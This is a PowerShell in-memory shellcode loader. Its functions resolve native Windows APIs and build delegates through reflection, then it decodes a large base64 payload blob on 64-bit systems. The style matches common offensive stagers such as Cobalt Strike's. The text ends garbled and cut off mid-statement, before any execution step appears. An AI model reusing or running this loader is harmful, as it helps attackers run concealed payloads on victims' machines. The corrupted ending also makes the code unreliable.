Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String('s7Ozs7Ozs7OzbnlicXZrqsZros8DIyMja64+ydzc3Guq/Gui4NdAIiPc8GKb05aBdUsnIyMjeWuq2tzzIyMjIyMjIyMj0yMjI8R7XZnQcVUAnifOudFUCVsWtV1H/i5MzaSogk6Jqx9CYoGhyk/Qy1a0afRxzjxl/gcdV6SB+tlSQcPDbpq7sV54T3k4PkXr2kGRtaO9rEEk+Tq6378g1mZuLa0vyp4Kt0XneqTiCDHxqYknfSfADzMHkYTmOyohb8MaPKk/Q+n2T618X3SWcOtTJfL7J0kdyMFcmFHEtA3kxuSOznrWflnkKGFlgIuVWcoLZXrG4/JQc2YjI0elJiPjlwZ7IyMjI+3c3NzTIwATKCEoIyOBISMj1yIjIyMjI+POKiMjMyMjIyMjoyIjIyMjMyMjIyEjIyYjISMjIyMjJiMhIyMjIyMjA2QjIycjIyMjIyMhI0MiIyMzIyMjIyMjMyMjIyMjIyMjMyMjIyMjIzMjIyMjIyP3mSIjMyMjI8OYICNxIyMjn4UgI0cjIyMjIyMjIyMjIyOzJyPDPCMjIyMjIyMjIyMjkycjJyUjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjc6ggI1MjIyMjIyMjIyMjIyPjISO7JSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjw5mIlZntIyPDgiEjIzMjIyOBISMjJ-zD)[]]$5hJrntDomain.DefineDyttion =2K